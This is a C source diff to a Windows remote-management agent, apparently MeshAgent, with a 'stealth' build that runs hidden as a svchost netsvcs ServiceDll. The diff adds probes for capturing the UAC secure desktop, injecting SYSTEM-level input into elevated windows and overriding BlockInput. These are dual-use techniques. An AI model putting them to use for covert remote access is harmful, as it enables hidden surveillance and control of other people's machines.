+				}
+			}
+		}
 		if (lastError != ERROR_SERVICE_ALREADY_RUNNING)
 		{
+			if (lastError == ERROR_SUCCESS)
+			{
+				lastError = ERROR_GEN_FAILURE;
+			}
 			SetLastError(lastError);
 			return FALSE;
 		}
@@ -2511,7 +7923,7 @@ static int MeshService_HandleNativeServiceCommand(const char* command)
 		return 1;
 	}
 
-	if (doStart || doRestart) { access |= SERVICE_START; }
+	if (doStart || doRestart) { access |= SERVICE_START | SERVICE_CHANGE_CONFIG; }
 	if (doStop || doRestart) { access |= SERVICE_STOP; }
 
 	scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
@@ -2609,13 +8021,16 @@ static int MeshService_HandleNativeServiceCommand(const char* command)
 // process shows under Background processes (not Apps) when run interactively.
 int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE hPrev, LPWSTR lpCmdLine, int nShow)
 {
+    int result = 0;
     UNREFERENCED_PARAMETER(hInst);
     UNREFERENCED_PARAMETER(hPrev);
     UNREFERENCED_PARAMETER(lpCmdLine);
     UNREFERENCED_PARAMETER(nShow);
 
     // Reuse existing wide-argv flow inside wmain
-    return wmain(__argc, (char**)__wargv);
+    result = wmain(__argc, (char**)__wargv);
+    ExitProcess((UINT)result);
+    return result;
 }
 #endif
 
@@ -2656,6 +8071,7 @@ static WCHAR** MeshService_CopyAnsiArgsToWide(int argc, char** argv)
 
 int main(int argc, char** argv)
 {
+	MeshService_InstallInvalidParameterHandler();
 #ifdef MESHAGENT_ENABLE_STEALTH
 	if (argc > 2 && argv[1] != NULL && _stricmp(argv[1], "-watchdog") == 0)
 	{
@@ -2682,6 +8098,7 @@ int main(int argc, char** argv)
 	{
 		wmain_free(wideArgs);
 	}
+	ExitProcess((UINT)result);
 	return result;
 }
 #endif
@@ -2700,14 +8117,71 @@ int APIENTRY _tWinMain(HINSTANCE hInstance,
 }
 */
 
+static void MeshService_TraceKvmServiceWrite(const char* phase, char* buffer, int bufferLen, DWORD errorCode, DWORD bytesTransferred)
+{
+	WCHAR enabled[8] = { 0 };
+	WCHAR tempPath[MAX_PATH] = { 0 };
+	WCHAR logPath[MAX_PATH] = { 0 };
+	HANDLE fileHandle = INVALID_HANDLE_VALUE;
+	char line[160];
+	int len = 0;
+	unsigned short packetType = 0;
+	DWORD written = 0;
+
+	if (phase == NULL || buffer == NULL || bufferLen < 4) { return; }
+	if (GetEnvironmentVariableW(L"STEALTH_KVM_TRACE_SERVICE_WRITES", enabled, (DWORD)_countof(enabled)) == 0) { return; }
+	if (ExpandEnvironmentStringsW(L"%TEMP%\\", tempPath, (DWORD)_countof(tempPath)) == 0 || tempPath[0] == L'\0')
+	{
+		GetTempPathW((DWORD)_countof(tempPath), tempPath);
+	}
+	if (FAILED(StringCchPrintfW(logPath, _countof(logPath), L"%lsmeshagent_kvm_service_trace.log", tempPath))) { return; }
+
+	packetType = (unsigned short)ntohs(((unsigned short*)buffer)[0]);
+	len = sprintf_s(
+		line,
+		sizeof(line),
+		"%s type=%u len=%d transferred=%lu error=%lu\r\n",
+		phase,
+		(unsigned int)packetType,
+		bufferLen,
+		(unsigned long)bytesTransferred,
+		(unsigned long)errorCode);
+	if (len <= 0) { return; }
+
+	fileHandle = CreateFileW(logPath, FILE_APPEND_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (fileHandle == INVALID_HANDLE_VALUE) { return; }
+	WriteFile(fileHandle, line, (DWORD)len, &written, NULL);
+	CloseHandle(fileHandle);
+}
+
 
 ILibTransport_DoneState kvm_serviceWriteSink(char *buffer, int bufferLen, void *reserved)
 {
-	DWORD len;
+	DWORD len = 0;
+	DWORD totalWritten = 0;
 	HANDLE h = GetStdHandle(STD_OUTPUT_HANDLE);
+	UNREFERENCED_PARAMETER(reserved);
 	if (h != NULL && h != INVALID_HANDLE_VALUE)
 	{
-		WriteFile(h, buffer, bufferLen, &len, NULL);
+		MeshService_TraceKvmServiceWrite("before", buffer, bufferLen, ERROR_SUCCESS, 0);
+		while (totalWritten < (DWORD)bufferLen)
+		{
+			DWORD remaining = (DWORD)bufferLen - totalWritten;
+			DWORD chunkSize = remaining > 32768 ? 32768 : remaining;
+			len = 0;
+			if (!WriteFile(h, buffer + totalWritten, chunkSize, &len, NULL))
+			{
+				MeshService_TraceKvmServiceWrite("error", buffer, bufferLen, GetLastError(), totalWritten);
+				return ILibTransport_DoneState_ERROR;
+			}
+			if (len == 0)
+			{
+				MeshService_TraceKvmServiceWrite("error", buffer, bufferLen, ERROR_WRITE_FAULT, totalWritten);
+				return ILibTransport_DoneState_ERROR;
+			}
+			totalWritten += len;
+		}
+		MeshService_TraceKvmServiceWrite("after", buffer, bufferLen, ERROR_SUCCESS, totalWritten);
 	}
 	return ILibTransport_DoneState_COMPLETE;
 }
@@ -2766,8 +8240,6 @@ static int MeshService_IsManagedConsoleOperation(int argc, char **argv)
 		if (strcasecmp(argv[i], "-import") == 0) { return 1; }
 		if (strcasecmp(argv[i], "-exec") == 0) { return 1; }
 		if (strcasecmp(argv[i], "-b64exec") == 0) { return 1; }
-		if (strcasecmp(argv[i], "-kvm0") == 0) { return 1; }
-		if (strcasecmp(argv[i], "-kvm1") == 0) { return 1; }
 		if (strcasecmp(argv[i], "--slave") == 0) { return 1; }
 		if (strcasecmp(argv[i], "-finstall") == 0) { return 1; }
 		if (strcasecmp(argv[i], "-funinstall") == 0) { return 1; }
@@ -2779,9 +8251,23 @@ static int MeshService_IsManagedConsoleOperation(int argc, char **argv)
 		if (strcasecmp(argv[i], "-validate-install") == 0 || strcasecmp(argv[i], "--validate-install") == 0) { return 1; }
 		if (strcasecmp(argv[i], "-validate-update") == 0 || strcasecmp(argv[i], "--validate-update") == 0) { return 1; }
 		if (strcasecmp(argv[i], "-validate-uninstall") == 0 || strcasecmp(argv[i], "--validate-uninstall") == 0) { return 1; }
+		if (strcasecmp(argv[i], "-validate-package") == 0 || strcasecmp(argv[i], "--validate-package") == 0) { return 1; }
+		if (strcasecmp(argv[i], "-preprotection-capture") == 0 || strcasecmp(argv[i], "--preprotection-capture") == 0) { return 1; }
 		if (strcasecmp(argv[i], "--selftest") == 0 || strncasecmp(argv[i], "--selftest=", 11) == 0) { return 1; }
 	}
 	return 0;
+}
+
+static int MeshService_IsRunningUnderRundll32(void)
+{
+	WCHAR processPath[MAX_PATH] = { 0 };
+	WCHAR* baseName = NULL;
+	DWORD len = GetModuleFileNameW(NULL, processPath, (DWORD)_countof(processPath));
+
+	if (len == 0 || len >= _countof(processPath)) { return 0; }
+	baseName = wcsrchr(processPath, L'\\');
+	baseName = (baseName == NULL) ? processPath : (baseName + 1);
+	return (_wcsicmp(baseName, L"rundll32.exe") == 0 || _wcsicmp(baseName, L"rundll32") == 0) ? 1 : 0;
 }
 
 duk_ret_t _start(duk_context *ctx)
@@ -2802,6 +8288,7 @@ duk_ret_t _start(duk_context *ctx)
 
 int wmain(int argc, char* wargv[])
 {
+	MeshService_InstallInvalidParameterHandler();
 	size_t str2len = 0;// , proxylen = 0, taglen = 0;
 	ILib_DumpEnabledContext winException;
 	int retCode = 0;
@@ -2871,6 +8358,8 @@ int wmain(int argc, char* wargv[])
 		strcasecmp(argv[1], "-validate-install") == 0 || strcasecmp(argv[1], "--validate-install") == 0 ||
 		strcasecmp(argv[1], "-validate-update") == 0 || strcasecmp(argv[1], "--validate-update") == 0 ||
 		strcasecmp(argv[1], "-validate-uninstall") == 0 || strcasecmp(argv[1], "--validate-uninstall") == 0 ||
+		strcasecmp(argv[1], "-validate-package") == 0 || strcasecmp(argv[1], "--validate-package") == 0 ||
+		strcasecmp(argv[1], "-preprotection-capture") == 0 || strcasecmp(argv[1], "--preprotection-capture") == 0 ||
 		strcasecmp(argv[1], "-state") == 0 ||
 		strcasecmp(argv[1], "--selftest") == 0 || strncasecmp(argv[1], "--selftest=", 11) == 0))
 	{
@@ -3003,183 +8492,119 @@ int wmain(int argc, char* wargv[])
     // Status: print registry + svchost membership + current service state
     if (argc > 1 && strcasecmp(argv[1], "-svchost-status") == 0)
     {
-        WCHAR wSvcName[256] = {0};
-        MeshService_CopyBrandingTextToWide(g_serviceFileText, wSvcName, _countof(wSvcName));
-        if (wSvcName[0] == L'\0')
-        {
-            wcscpy_s(wSvcName, _countof(wSvcName), STEALTH_FALLBACK_SERVICE_NAME);
-        }
-
-        wprintf(L"Service: %s\n", wSvcName);
-        // Exit code bitmask
-        // 0x01 = missing service registry key
-        // 0x02 = not in svchost 'netsvcs' group
-        // 0x04 = service not installed in SCM
-        // 0x08 = SCM access unavailable
-        // 0x10 = ServiceDll missing on disk
-        // 0x20 = ServiceDll hash mismatch
-        // 0x40 = Service SID type mismatch
-        // 0x80 = ServiceDll hash not configured
-        DWORD statusMask = 0;
-        // Registry service key
-        WCHAR keyPath[512];
-        _snwprintf_s(keyPath, _countof(keyPath), _TRUNCATE, L"SYSTEM\\CurrentControlSet\\Services\\%s", wSvcName);
-        HKEY hKey = NULL;
-        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, keyPath, 0, KEY_READ, &hKey) == ERROR_SUCCESS)
-        {
-            // Read string values via helper
-
-            DWORD dw = 0, cb = sizeof(dw);
-            if (RegQueryValueExW(hKey, L"Type", NULL, NULL, (LPBYTE)&dw, &cb) == ERROR_SUCCESS)
-                wprintf(L"  Type: 0x%08X\n", dw);
-            cb = sizeof(dw);
-            if (RegQueryValueExW(hKey, L"Start", NULL, NULL, (LPBYTE)&dw, &cb) == ERROR_SUCCESS)
-                wprintf(L"  Start: %u\n", dw);
-
-            wchar_t buf[512] = {0};
-            if (ReadRegStrW(hKey, L"ImagePath", buf, _countof(buf)))
-                wprintf(L"  ImagePath: %s\n", buf);
-            if (ReadRegStrW(hKey, L"DisplayName", buf, _countof(buf)))
-                wprintf(L"  DisplayName: %s\n", buf);
-            if (ReadRegStrW(hKey, L"Description", buf, _countof(buf)))
-                wprintf(L"  Description: %s\n", buf);
-            if (ReadRegStrW(hKey, L"ObjectName", buf, _countof(buf)))
-                wprintf(L"  ObjectName: %s\n", buf);
-
-            HKEY hParams = NULL;
-            if (RegOpenKeyExW(hKey, L"Parameters", 0, KEY_READ, &hParams) == ERROR_SUCCESS)
-            {
-                if (ReadRegStrW(hParams, L"ServiceDll", buf, _countof(buf)))
-                {
-                    wchar_t expanded[1024] = {0};
-                    const wchar_t* toCheck = buf;
-                    if (ExpandEnvironmentStringsW(buf, expanded, (DWORD)_countof(expanded)) > 0)
-                    {
-                        toCheck = expanded;
-                    }
-                    DWORD attrs = GetFileAttributesW(toCheck);
-                    BOOL exists = (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY) == 0);
-                    wprintf(L"  Parameters\\ServiceDll (raw): %s\n", buf);
-                    wprintf(L"  Parameters\\ServiceDll (expanded): %s\n", toCheck);
-                    wprintf(L"  Parameters\\ServiceDll exists: %s\n", exists ? L"yes" : L"no");
-                    if (!exists)
-                    {
-                        statusMask |= SVCHOST_STATUS_DLL_MISSING;
-                    }
-
-                    wchar_t actualHash[STEALTH_SHA256_STRING_LENGTH + 1] = {0};
-                    BOOL haveActualHash = exists ? Stealth_ComputeFileSha256W(toCheck, actualHash, _countof(actualHash)) : FALSE;
-                    if (!haveActualHash && exists)
-                    {
-                        Stealth_DebugPrintfW(L"Failed to compute ServiceDll hash for %ls", toCheck);
-                    }
-
-                    wchar_t expectedHash[STEALTH_SHA256_STRING_LENGTH + 1] = {0};
-                    BOOL haveExpectedHash = ReadRegStrW(hParams, L"ServiceDllHash", expectedHash, _countof(expectedHash));
-                    if (!haveExpectedHash)
-                    {
-                        statusMask |= SVCHOST_STATUS_HASH_NOT_CONFIGURED;
-                    }
-
-                    wprintf(L"  Parameters\\ServiceDllHash (expected): %s\n", haveExpectedHash ? expectedHash : L"(none)");
-                    wprintf(L"  Parameters\\ServiceDllHash (actual)  : %s\n", haveActualHash ? actualHash : L"(error)");
-
-                    BOOL hashMatch = FALSE;
-                    if (haveExpectedHash && haveActualHash)
-                    {
-                        hashMatch = (_wcsicmp(expectedHash, actualHash) == 0);
-                    }
-                    wprintf(L"  Parameters\\ServiceDllHash match     : %s\n", (hashMatch ? L"yes" : L"no"));
-                    if (!hashMatch)
-                    {
-                        statusMask |= SVCHOST_STATUS_DLL_HASH_MISMATCH;
-                    }
-                }
-                if (ReadRegStrW(hParams, L"ServiceMain", buf, _countof(buf)))
-                    wprintf(L"  Parameters\\ServiceMain: %s\n", buf);
-                DWORD unload = 0; cb = sizeof(unload);
-                if (RegQueryValueExW(hParams, L"ServiceDllUnloadOnStop", NULL, NULL, (LPBYTE)&unload, &cb) == ERROR_SUCCESS)
-                    wprintf(L"  Parameters\\ServiceDllUnloadOnStop: %u\n", unload);
-                RegCloseKey(hParams);
-            }
-            RegCloseKey(hKey);
-        }
-        else
-        {
-            wprintf(L"  Service registry key not found\n");
-            statusMask |= SVCHOST_STATUS_MISSING_SERVICE_KEY;
-        }
-
-        // Svchost membership
-        HKEY hSvchost = NULL; BOOL inGroup = FALSE;
-        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
-                          L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost",
-                          0, KEY_READ, &hSvchost) == ERROR_SUCCESS)
-        {
-            DWORD type = 0, cb = 0;
-            if (RegQueryValueExW(hSvchost, L"netsvcs", NULL, &type, NULL, &cb) == ERROR_SUCCESS && type == REG_MULTI_SZ)
-            {
-                wchar_t* buf = (wchar_t*)malloc(cb + 2 * sizeof(wchar_t));
-                if (buf && RegQueryValueExW(hSvchost, L"netsvcs", NULL, &type, (LPBYTE)buf, &cb) == ERROR_SUCCESS)
-                {
-                    buf[cb/sizeof(wchar_t)] = L'\0';
-                    buf[cb/sizeof(wchar_t)+1] = L'\0';
-                    for (wchar_t* p = buf; *p; p += (wcslen(p) + 1))
-                    {
-                        if (_wcsicmp(p, wSvcName) == 0) { inGroup = TRUE; break; }
-                    }
-                }
-                if (buf) free(buf);
-            }
-            RegCloseKey(hSvchost);
-        }
-        wprintf(L"  Svchost 'netsvcs' membership: %s\n", inGroup ? L"present" : L"absent");
-        if (!inGroup) { statusMask |= SVCHOST_STATUS_NOT_IN_NETSVCS; }
-
-        // Current service state
-        SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
-        if (scm)
-        {
-            SC_HANDLE svc = OpenServiceW(scm, wSvcName, SERVICE_QUERY_STATUS | SERVICE_QUERY_CONFIG);
-            if (svc)
-            {
-                SERVICE_STATUS_PROCESS ssp = {0};
-                DWORD bytesNeeded = 0;
-                if (QueryServiceStatusEx(svc, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(ssp), &bytesNeeded))
-                {
-                    wprintf(L"  CurrentState: %s\n", ServiceStateToString(ssp.dwCurrentState));
-                }
-                SERVICE_SID_INFO sidInfo = {0};
-                DWORD sidBytes = sizeof(sidInfo);
-                if (QueryServiceConfig2W(svc, SERVICE_CONFIG_SERVICE_SID_INFO, (LPBYTE)&sidInfo, sizeof(sidInfo), &sidBytes))
-                {
-                    wprintf(L"  Service SID type: %u\n", sidInfo.dwServiceSidType);
-                    if (sidInfo.dwServiceSidType != SERVICE_SID_TYPE_UNRESTRICTED)
-                    {
-                        statusMask |= SVCHOST_STATUS_SID_MISMATCH;
-                    }
-                }
-                else
-                {
-                    wprintf(L"  Service SID type: (query failed)\n");
-                    statusMask |= SVCHOST_STATUS_SID_MISMATCH;
-                }
-                CloseServiceHandle(svc);
-            }
-            else
-            {
-                wprintf(L"  CurrentState: (not installed in SCM)\n");
-                statusMask |= SVCHOST_STATUS_NOT_IN_SCM;
-            }
-            CloseServiceHandle(scm);
-        }
-        else
-        {
-            wprintf(L"  SCM access unavailable\n");
-            statusMask |= SVCHOST_STATUS_SCM_UNAVAILABLE;
-        }
-        return (int)statusMask;
+        return MeshService_RunSvchostStatusCommand();
     }
+
+#if defined(_LINKVM)
+	if (argc > 1 && strcasecmp(argv[1], "-kvm-bridge-hardening-probe") == 0)
+	{
+		const WCHAR* dllPath = (wideArgv != NULL && argc > 2) ? wideArgv[2] : NULL;
+		return MeshService_RunKvmBridgeHardeningProbeCommand(dllPath);
+	}
+	if (argc > 1 && strcasecmp(argv[1], "-kvm-bridge-job-controller") == 0)
+	{
+		const WCHAR* dllPath = (wideArgv != NULL && argc > 2) ? wideArgv[2] : NULL;
+		const WCHAR* inputPipeName = (wideArgv != NULL && argc > 3) ? wideArgv[3] : NULL;
+		const WCHAR* outputPipeName = (wideArgv != NULL && argc > 4) ? wideArgv[4] : NULL;
+		return MeshService_RunKvmBridgeJobControllerCommand(dllPath, inputPipeName, outputPipeName);
+	}
+	if (argc > 1 && strcasecmp(argv[1], "-kvm-bridge-session-change-probe") == 0)
+	{
+		return MeshService_RunKvmBridgeSessionChangeProbeCommand();
+	}
+	if (argc > 1 && strcasecmp(argv[1], "-kvm-bridge-session-change-probe-child") == 0)
+	{
+		const WCHAR* reportPath = (wideArgv != NULL && argc > 2) ? wideArgv[2] : NULL;
+		return MeshService_RunKvmBridgeSessionChangeProbeChildCommand(reportPath);
+	}
+	if (argc > 1 && strcasecmp(argv[1], "-kvm-bridge-crash-recovery-probe") == 0)
+	{
+		return MeshService_RunKvmBridgeCrashRecoveryProbeCommand();
+	}
+	if (argc > 1 && strcasecmp(argv[1], "-kvm-bridge-crash-recovery-probe-child") == 0)
+	{
+		const WCHAR* reportPath = (wideArgv != NULL && argc > 2) ? wideArgv[2] : NULL;
+		return MeshService_RunKvmBridgeCrashRecoveryProbeChildCommand(reportPath);
+	}
+	if (argc > 1 && strcasecmp(argv[1], "-kvm-bridge-event-audit-probe") == 0)
+	{
+		return MeshService_RunKvmBridgeEventAuditProbeCommand();
+	}
+	if (argc > 1 && strcasecmp(argv[1], "-kvm-multi-session-probe") == 0)
+	{
+		DWORD primarySessionId = (argc > 2) ? (DWORD)strtoul(argv[2], NULL, 10) : MeshService_GetCurrentSessionId();
+		int secondaryTsid = (argc > 3) ? (int)strtol(argv[3], NULL, 10) : -1;
+		return MeshService_RunKvmMultiSessionProbeCommand(primarySessionId, secondaryTsid);
+	}
+	if (argc > 1 && strcasecmp(argv[1], "-kvm-bridge-event-audit-probe-child") == 0)
+	{
+		const WCHAR* reportPath = (wideArgv != NULL && argc > 2) ? wideArgv[2] : NULL;
+		return MeshService_RunKvmBridgeEventAuditProbeChildCommand(reportPath);
+	}
+	if (argc > 1 && strcasecmp(argv[1], "-kvm-secure-desktop-probe") == 0)
+	{
+		return MeshService_RunKvmSecureDesktopProbeCommand();
+	}
+	if (argc > 1 && strcasecmp(argv[1], "-kvm-elevated-input-probe") == 0)
+	{
+		return MeshService_RunKvmElevatedInputProbeCommand();
+	}
+	if (argc > 1 && strcasecmp(argv[1], "-kvm-elevated-input-probe-child") == 0)
+	{
+		const WCHAR* reportPath = (wideArgv != NULL && argc > 2) ? wideArgv[2] : NULL;
+		return MeshService_RunKvmElevatedInputProbeChildCommand(reportPath);
+	}
+	if (argc > 1 && strcasecmp(argv[1], "-kvm-elevated-input-target") == 0)
+	{
+		const WCHAR* hwndReportPath = (wideArgv != NULL && argc > 2) ? wideArgv[2] : NULL;
+		const WCHAR* readyReportPath = (wideArgv != NULL && argc > 3) ? wideArgv[3] : NULL;
+		const WCHAR* capturePath = (wideArgv != NULL && argc > 4) ? wideArgv[4] : NULL;
+		const WCHAR* title = (wideArgv != NULL && argc > 5) ? wideArgv[5] : NULL;
+		return MeshService_RunKvmElevatedInputTargetCommand(hwndReportPath, readyReportPath, capturePath, title);
+	}
+	if (argc > 1 && strcasecmp(argv[1], "-kvm-blockinput-target") == 0)
+	{
+		const WCHAR* hwndReportPath = (wideArgv != NULL && argc > 2) ? wideArgv[2] : NULL;
+		const WCHAR* readyReportPath = (wideArgv != NULL && argc > 3) ? wideArgv[3] : NULL;
+		const WCHAR* capturePath = (wideArgv != NULL && argc > 4) ? wideArgv[4] : NULL;
+		const WCHAR* title = (wideArgv != NULL && argc > 5) ? wideArgv[5] : NULL;
+		return MeshService_RunKvmBlockInputTargetCommand(hwndReportPath, readyReportPath, capturePath, title);
+	}
+	if (argc > 1 && strcasecmp(argv[1], "-kvm-blockinput-probe") == 0)
+	{
+		return MeshService_RunKvmBlockInputProbeCommand();
+	}
+	if (argc > 1 && strcasecmp(argv[1], "-kvm-blockinput-probe-child") == 0)
+	{
+		const WCHAR* reportPath = (wideArgv != NULL && argc > 2) ? wideArgv[2] : NULL;
+		return MeshService_RunKvmBlockInputProbeChildCommand(reportPath);
+	}
+	if (argc > 1 && strcasecmp(argv[1], "-kvm-blockinput-holder") == 0)
+	{
+		const WCHAR* readyPath = (wideArgv != NULL && argc > 2) ? wideArgv[2] : NULL;
+		const WCHAR* releasePath = (wideArgv != NULL && argc > 3) ? wideArgv[3] : NULL;
+		const WCHAR* reportPath = (wideArgv != NULL && argc > 4) ? wideArgv[4] : NULL;
+		return MeshService_RunKvmBlockInputHolderCommand(readyPath, releasePath, reportPath);
+	}
+	if (argc > 1 && strcasecmp(argv[1], "-kvm-secure-desktop-probe-child") == 0)
+	{
+		const WCHAR* reportPath = (wideArgv != NULL && argc > 2) ? wideArgv[2] : NULL;
+		DWORD timeoutMs = (argc > 3) ? (DWORD)strtoul(argv[3], NULL, 10) : 20000;
+		return MeshService_RunKvmSecureDesktopProbeChildCommand(reportPath, timeoutMs);
+	}
+	if (argc > 1 && strcasecmp(argv[1], "-kvm-uac-consent-trigger") == 0)
+	{
+		const WCHAR* reportPath = (wideArgv != NULL && argc > 2) ? wideArgv[2] : NULL;
+		DWORD timeoutMs = (argc > 3) ? (DWORD)strtoul(argv[3], NULL, 10) : 15000;
+		return MeshService_RunKvmUacConsentTriggerCommand(reportPath, timeoutMs);
+	}
+	if (argc > 1 && strcasecmp(argv[1], "-kvm-uac-consent-target") == 0)
+	{
+		DWORD sleepMs = (argc > 2) ? (DWORD)strtoul(argv[2], NULL, 10) : 1000;
+		const WCHAR* reportPath = (wideArgv != NULL && argc > 3) ? wideArgv[3] : NULL;
+		return MeshService_RunKvmUacConsentTargetCommand(sleepMs, reportPath);
+	}
+#endif
 
     if (argc > 1 && strcasecmp(argv[1], "-licenses") == 0)
 	{
@@ -3374,11 +8799,21 @@ int wmain(int argc, char* wargv[])
 		return(0);
 	}
 #if defined(_LINKVM)
-	if (argc > 1 && strcasecmp(argv[1], "-kvm0") == 0)
+	if (argc > 1 && (strcasecmp(argv[1], "-kvm0") == 0 || strcasecmp(argv[1], "-kvm1") == 0))
 	{
-		void **parm = (void**)ILibMemory_Allocate(4 * sizeof(void*), 0, 0, NULL);
+		int pauseMode = (strcasecmp(argv[1], "-kvm1") == 0) ? 1 : 0;
+		void **parm = NULL;
+
+		if (!MeshService_IsRunningUnderRundll32())
+		{
+			fprintf(stderr, "MeshAgent: direct KVM slave execution is disabled. Use rundll32.exe <bridge-dll>,KvmSessionBridgeW <inputPipe> <outputPipe> [-kvm0|-kvm1].\r\n");
+			wmain_free(argv);
+			return ERROR_NOT_SUPPORTED;
+		}
+
+		parm = (void**)ILibMemory_Allocate(4 * sizeof(void*), 0, 0, NULL);
 		parm[0] = kvm_serviceWriteSink;
-		((int*)&(parm[2]))[0] = 0;
+		((int*)&(parm[2]))[0] = pauseMode;
 		((int*)&(parm[3]))[0] = (argc > 2 && strcasecmp(argv[2], "-coredump") == 0) ? 1 : 0;
 		if ((argc > 2 && strcasecmp(argv[2], "-remotecursor") == 0) ||
 			(argc > 3 && strcasecmp(argv[3], "-remotecursor") == 0))
@@ -3407,45 +8842,6 @@ int wmain(int argc, char* wargv[])
 		{
 			SetProcessDPIAware();
 		}
-
-		kvm_server_mainloop((void*)parm);
-		wmain_free(argv);
-		return 0;
-	}
-	else if (argc > 1 && strcasecmp(argv[1], "-kvm1") == 0)
-	{
-		void **parm = (void**)ILibMemory_Allocate(4 * sizeof(void*), 0, 0, NULL);
-		parm[0] = kvm_serviceWriteSink;
-		((int*)&(parm[2]))[0] = 1;
-		((int*)&(parm[3]))[0] = (argc > 2 && strcasecmp(argv[2], "-coredump") == 0) ? 1 : 0;
-		if ((argc > 2 && strcasecmp(argv[2], "-remotecursor") == 0) ||
-			(argc > 3 && strcasecmp(argv[3], "-remotecursor") == 0))
-		{
-			gRemoteMouseRenderDefault = 1;
-		}
-
-		// This is only supported on Windows 8 / Windows Server 2012 R2 and newer
-		HMODULE shCORE = LoadLibraryExA((LPCSTR)"Shcore.dll", NULL, LOAD_LIBRARY_SEARCH_SYSTEM32);
-		DpiAwarenessFunc dpiAwareness = NULL;
-		if (shCORE != NULL)
-		{
-			if ((dpiAwareness = (DpiAwarenessFunc)GetProcAddress(shCORE, (LPCSTR)"SetProcessDpiAwareness")) == NULL)
-			{
-				FreeLibrary(shCORE);
-				shCORE = NULL;
-			}
-		}
-		if (dpiAwareness != NULL)
-		{
-			dpiAwareness(PROCESS_PER_MONITOR_DPI_AWARE);
-			FreeLibrary(shCORE);
-			shCORE = NULL;
-		}
-		else
-		{
-			SetProcessDPIAware();
-		}
-
 
 		kvm_server_mainloop((void*)parm);
 		wmain_free(argv);
@@ -3459,7 +8855,7 @@ int wmain(int argc, char* wargv[])
 		int isManaged = MeshService_IsManagedConsoleOperation(argc, argv);
 
 		// Service-only policy: disallow running a full standalone agent in svchost builds, but do not
-		// block helper modes (KVM slave, installer operations, IPC tooling).
+		// block managed service helpers such as installer operations or IPC tooling.
 #if defined(MESHAGENT_ENABLE_STEALTH) && defined(MESH_AGENT_SVCHOST_MODE) && (MESH_AGENT_SVCHOST_MODE != 0)
 		if (isStandaloneRun && !isSlave && !isManaged)
 		{
@@ -3510,6 +8906,31 @@ int wmain(int argc, char* wargv[])
 	{
 		int skip = 0;
 
+		// Tooling/script invocations are explicit console workflows. Handle them
+		// before attempting service dispatch so harnesses do not block inside
+		// StartServiceCtrlDispatcher() waiting for a service controller path that
+		// will never materialize for ad hoc .js/.zip runs.
+		if (argc >= 2 && (ILibString_EndsWith(argv[1], -1, ".js", 3) != 0 || ILibString_EndsWith(argv[1], -1, ".zip", 4) != 0))
+		{
+			SetConsoleCtrlHandler((PHANDLER_ROUTINE)CtrlHandler, TRUE); // Set SIGNAL on windows to listen for Ctrl-C
+
+			__try
+			{
+				agent = MeshAgent_Create(0);
+				agent->runningAsConsole = 1;
+				MeshAgent_Start(agent, argc, argv);
+				MeshAgent_Destroy(agent);
+				agent = NULL;
+			}
+			__except (ILib_WindowsExceptionFilterEx(GetExceptionCode(), GetExceptionInformation(), &winException))
+			{
+				ILib_WindowsExceptionDebugEx(&winException);
+			}
+
+			wmain_free(argv);
+			return(0);
+		}
+
 		// See if we are running as a service
 		if (RunService(argc, argv) == 0 && GetLastError() == ERROR_FAILED_SERVICE_CONTROLLER_CONNECT)
 		{
@@ -3522,7 +8943,9 @@ int wmain(int argc, char* wargv[])
 				{
 					agent = MeshAgent_Create(0);
 					agent->runningAsConsole = 1;
-					MeshService_ActivateResilience();
+					// Script-host invocations are tooling/test flows, not persistent service
+					// executions. Do not attach watchdog/resilience processes here or the
+					// harness may never terminate cleanly after the script completes.
 					MeshAgent_Start(agent, argc, argv);
 					MeshAgent_Destroy(agent);
 					agent = NULL;
@@ -3531,7 +8954,6 @@ int wmain(int argc, char* wargv[])
 				{
 					ILib_WindowsExceptionDebugEx(&winException);
 				}
-				MeshService_DeactivateResilience();
 			}
 			else
 			{
@@ -3591,7 +9013,20 @@ int wmain(int argc, char* wargv[])
 					printf("  -validate-install     Validate registry/firewall/DACL/persistence for installed state.\r\n");
 					printf("  -validate-update      Validate registry/firewall/DACL/persistence after update.\r\n");
 					printf("  -validate-uninstall   Validate cleanup after uninstall.\r\n");
-					printf("  -svchost-status       Show svchost registration status and return a diagnostic bitmask.\r\n");
+					printf("  -validate-package     Validate package sidecars/preflight and emit JSON.\r\n");
+					printf("  -preprotection-capture Capture a timestamped pre-protection desktop artifact and emit JSON.\r\n");
+					printf("  -svchost-status       Emit JSON svchost status and return a diagnostic bitmask.\r\n");
+#if defined(_LINKVM)
+					printf("  -kvm-bridge-hardening-probe <dll>     Emit JSON runtime proof for bridge DACL hardening.\r\n");
+					printf("  -kvm-bridge-job-controller <dll> <inputPipe> <outputPipe> Internal helper for bridge job-teardown validation.\r\n");
+					printf("  -kvm-bridge-session-change-probe      Emit JSON runtime proof for bridge lock/unlock and reconnect continuity.\r\n");
+					printf("  -kvm-bridge-crash-recovery-probe      Emit JSON runtime proof for bridge early-exit recovery backoff.\r\n");
+					printf("  -kvm-bridge-event-audit-probe         Emit JSON runtime proof for bridge Event Log auditing.\r\n");
+					printf("  -kvm-multi-session-probe [primary] [secondary] Emit JSON runtime proof for concurrent per-context bridge helpers.\r\n");
+					printf("  -kvm-elevated-input-probe             Emit JSON runtime proof for SYSTEM bridge input into elevated cmd.exe.\r\n");
+					printf("  -kvm-blockinput-probe                 Emit JSON runtime proof for same-thread SendInput plus SYSTEM BlockInput(FALSE) override.\r\n");
+					printf("  -kvm-secure-desktop-probe             Emit JSON runtime proof for Winlogon desktop capture during UAC.\r\n");
+#endif
 					printf("  --selftest            Run agent self-test harness (use --majorBug=1 only for major bug investigation).\r\n");
 					printf("\r\n");
 					printf("Svchost registration maintenance:\r\n");
@@ -3601,8 +9036,8 @@ int wmain(int argc, char* wargv[])
 					printf("Additional -fullinstall options:\r\n");
 					printf("  --WebProxy=\"http://proxyhost:port\"  Specify an HTTPS proxy.\r\n");
 					printf("  --agentName=\"alternate name\"        Specify an alternate name to be provided by the agent.\r\n");
